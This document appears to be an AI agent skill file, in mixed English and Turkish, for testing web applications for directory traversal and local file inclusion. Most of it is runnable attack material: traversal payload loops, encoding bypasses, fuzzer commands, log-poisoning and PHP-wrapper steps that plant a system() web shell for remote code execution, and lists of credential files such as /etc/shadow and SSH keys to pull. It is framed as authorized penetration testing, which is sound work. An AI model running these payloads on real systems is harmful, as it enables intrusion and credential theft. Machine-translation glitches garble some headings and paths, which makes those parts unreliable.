---
name: performing-directory-traversal-testing
description: Testing web applications for path traversal vulnerabilities that allow reading or writing arbitrary files on the server by manipulating file path parameters.
tags:
- cybersecurity
- directory-traversal
- web-security
- path-traversal
- owasp
- fetih
- web-application-security
- lfi
- penetration-testing
- siber-güvenlik
triggers:
- CSRF
- SQL injection
- XSS
- api
- directory
- endpoint
- exploit
- http
- log
- password
- performing
- sql
category: web-application-security
source_subdomain: web-application-security
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
adapted_for: fetih
---

# Performing Directory Traversal Testing


## Ne Zaman Kullanılır

- During authorized penetration tests when the application handles file paths in URL parameters or request bodies
- testing yaparken file download, file view, or file include functionality
- For assessing Local File Inclusion (LFI) and Remote File Inclusion (RFI) vulnerabilities
- evaluating yaparken: template engines, logging systems, or report generators that reference files
- During security assessments of APIs that accept file names or paths as parameters

## Ön Gereksinimler

- **Authorization**: Written penetration testing agreement for the target
- **Burp Suite Professional**: For intercepting and modifying file path parameters
- **ffuf**: For fuzzing file path parameters with traversal payloads
- **dotdotpwn**: Automated directory traversal fuzzer (`apt install dotdotpwn`)
- **SecLists**: Traversal payload wordlists from Daniel Miessler's collection
- **curl**: For manual testing of traversal payloads

## İş Akışı

### Adım 1: Identify File Path Parameters

Bul: application endpoints that reference files through parameters.

```bash


curl -s "https://target.example.com/download?file=report.pdf" -o /dev/null -w "%{http_code} %{size_download}"

curl -s "https://target.example.com/download?file=../../../etc/passwd"
```

### Adım 2: Test Basic Directory Traversal Payloads

Attempt to escape the intended directory and read sensitive files.

```bash
PAYLOADS=(
  "../../../etc/passwd"
  "../../../../etc/passwd"
  "../../../../../etc/passwd"
  "../../../../../../etc/passwd"
  "../../../../../../../etc/passwd"
  "..%2f..%2f..%2fetc%2fpasswd"
  "..%252f..%252f..%252fetc%252fpasswd"
  "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
  "....//....//....//etc/passwd"
  "..;/..;/..;/etc/passwd"
)

for payload in "${PAYLOADS[@]}"; do
  echo -n "Testing: $payload -> "
  response=$(curl -s "https://target.example.com/download?file=$payload")
  if echo "$response" | grep -q "root:"; then
    echo "VULNERABLE"
  else
    echo "Blocked"
  fi
done

WIN_PAYLOADS=(
  "..\..\..\windows\win.ini"
  "..%5c..%5c..%5cwindows%5cwin.ini"
  "..\/..\/..\/windows/win.ini"
  "....\\....\\....\\windows\\win.ini"
)

for payload in "${WIN_PAYLOADS[@]}"; do
  echo -n "Testing: $payload -> "
  curl -s "https://target.example.com/download?file=$payload" | head -c 100
  echo
done
```

### Adım 3: Apply Encoding and Filter Bypass Techniques

Use various encoding schemes to bypass input validation filters.

```bash
curl -s "https://target.example.com/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"

curl -s "https://target.example.com/download?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"

curl -s "https://target.example.com/download?file=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd"

curl -s "https://target.example.com/download?file=../../../etc/passwd%00.pdf"

LONG_PATH="../../../etc/passwd"
for i in $(seq 1 200); do LONG_PATH="${LONG_PATH}/."; done
curl -s "https://target.example.com/download?file=$LONG_PATH"

curl -s "https://target.example.com/download?file=..\..\..\..\WiNdOwS\win.ini"

curl -s "https://target.example.com/download?file=....//....//....//etc/passwd"
curl -s "https://target.example.com/download?file=....//../../../etc/passwd"

curl -s "https://target.example.com/download?file=/etc/passwd"
```

### Adım 4: Automate with ffuf and dotdotpwn

Use automated tools for comprehensive traversal testing.

```bash
ffuf -u "https://target.example.com/download?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 \
  -fs 0 \
  -t 20 -rate 50 \
  -o traversal-results.json -of json

dotdotpwn -m http-url \
  -u "https://target.example.com/download?file=TRAVERSAL" \
  -k "root:" \
  -o /tmp/dotdotpwn-results.txt \
  -d 8 -t 200

```

### Adım 5: Test Local File Inclusion (LFI) for Code Execution

If LFI is confirmed, attempt to escalate to remote code execution.

```bash
curl -s -A "<?php system(\$_GET['cmd']); ?>" \
  "https://target.example.com/"

curl -s "https://target.example.com/page?file=../../../var/log/apache2/access.log&cmd=id"

curl -s "https://target.example.com/page?file=php://filter/convert.base64-encode/resource=config.php"

curl -s -X POST \
  -d "<?php system('id'); ?>" \
  "https://target.example.com/page?file=php://input"

curl -s "https://target.example.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="

curl -s -A "<?php phpinfo(); ?>" \
  "https://target.example.com/page?file=../../../proc/self/environ"

```

### Adım 6: Read High-Value Files

Target sensitive configuration and credential files.

```bash
HIGH_VALUE_LINUX=(
  "/etc/passwd"
  "/etc/shadow"
  "/etc/hosts"
  "/etc/hostname"
  "/proc/self/environ"
  "/proc/self/cmdline"
  "/var/www/html/.env"
  "/var/www/html/config.php"
  "/var/www/html/wp-config.php"
  "/home/user/.ssh/id_rsa"
  "/home/user/.bash_history"
  "/root/.bash_history"
  "/var/log/auth.log"
)

for file in "${HIGH_VALUE_LINUX[@]}"; do
  traversal="../../../../../../..$file"
  echo -n "$file: "
  response=$(curl -s "https://target.example.com/download?file=$traversal")
  if [ ${#response} -gt 10 ]; then
    echo "READABLE (${#response} bytes)"
  else
    echo "Not accessible"
  fi
done

HIGH_VALUE_WIN=(
  "C:\\Windows\\win.ini"
  "C:\\Windows\\System32\\drivers\\etc\\hosts"
  "C:\\inetpub\\wwwroot\\web.config"
  "C:\\Users\\Administrator\\.ssh\\id_rsa"
  "C:\\xampp\\apache\\conf\\httpd.conf"
  "C:\\xampp\\mysql\\data\\mysql\\user.MYD"
)
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Directory Traversal** | Using `../` sequences to Şuraya git: parent directories and access files outside the intended path |
| **Local File Inclusion (LFI)** | Server-side inclusion of local files, potentially leading to code execution |
| **Remote File Inclusion (RFI)** | Including files from external URLs (requires `allow_url_include=On` in PHP) |
| **Null Byte Injection** | Using `%00` to truncate file paths, bypassing extension checks in older PHP versions |
| **PHP Wrappers** | Protocols like `php://filter`, `php://input`, `data://` for reading and executing files |
| **Log Poisoning** | Injecting code into log files and then including them via LFI for code execution |
| **Path Canonicalization** | The process of resolving relative paths to absolute paths, which can be exploited |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Request interception and Intruder for automated payload testing |
| **ffuf** | Fast fuzzing with LFI/traversal wordlists |
| **dotdotpwn** | Dedicated directory traversal fuzzer with multiple traversal patterns |
| **LFISuite** | Automated LFI exploitation tool with multiple techniques |
| **SecLists** | Comprehensive wordlists including LFI payloads and traversal patterns |
| **Kadimus** | LFI scanning and exploitation tool |

## Common Scenarios

### Scenario 1: File Download Traversal
A document download endpoint at `/download?file=report.pdf` does not Şunu doğrula: file parameter. Replacing the value with `../../../etc/passwd` returns the server's password file.

### Scenario 2: Template LFI to RCE
A PHP application includes templates via `?page=home`. By poisoning the Apache access log with PHP code in the User-Agent header, then including the log file, the attacker achieves remote code execution.

### Scenario 3: Image Path Traversal
An image resizing service accepts `?src=images/photo.jpg`. The application strips `../` once but does not recurse, so `....//....//etc/passwd` bypasses the filter.

### Scenario 4: Windows IIS Configuration Leak
A .NET application serves files via `?path=docs\manual.pdf`. Traversing to `..\..\web.config` exposes the IIS configuration file containing database connection strings.

## Output Format

```
## Directory Traversal Bul:ing

**Vulnerability**: Path Traversal / Local File Inclusion
**Severity**: High (CVSS 8.6)
**Location**: GET /download?file=../../../etc/passwd
**OWASP Category**: A01:2021 - Broken Access Control

### Reproduction Steps
1. Şuraya git: https://target.example.com/download?file=report.pdf
2. Replace file parameter: ?file=../../../etc/passwd
3. Server returns contents of /etc/passwd

### Files Retrieved
| File | Impact |
|------|--------|
| /etc/passwd | User enumeration (42 accounts) |
| /var/www/html/.env | Database credentials exposed |
| /home/Dağıt:/.ssh/id_rsa | SSH private key recovered |
| /proc/self/environ | Environment variables with API keys |

### Filter Bypass Required
Original `../` stripped by filter. Successful bypass: `....//....//....//etc/passwd`

### Recommendation
1. Use an allowlist of permitted file names rather than accepting arbitrary paths
2. Resolve the canonical path and verify it stays within the intended directory
3. Run the web server with minimal file system permissions
4. Remove sensitive files from web-accessible directories
5. Disable PHP wrappers (allow_url_include, allow_url_fopen) if not required
```

<!--
  ⚔ Bu skill FETIH AI Agent icin gelistirilmistir — https://github.com/MustafaKemal0146/fetih
  Yetkisiz kullanim/kopyalama tespit edilebilir.
  hash: c1f9ba3a0ef155ff
-->

